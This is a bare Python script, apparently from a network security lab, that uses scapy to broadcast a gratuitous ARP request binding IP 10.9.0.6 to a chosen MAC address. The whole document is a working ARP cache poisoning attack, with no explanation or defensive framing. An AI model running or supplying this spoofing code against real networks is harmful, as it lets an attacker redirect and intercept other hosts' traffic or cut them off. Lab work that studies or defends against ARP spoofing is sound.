#!/bin/env python3

from scapy.all import *

bc_mac  = 'ff:ff:ff:ff:ff:ff'
map_ip  = '10.9.0.6'
map_mac = '02:42:0a:09:00:69'

eth = Ether(dst=bc_mac)
arp = ARP(pdst=map_ip, hwdst=bc_mac, psrc=map_ip, hwsrc=map_mac)
arp.op = 1 # request: 1, reply: 2
sendp(eth/arp)
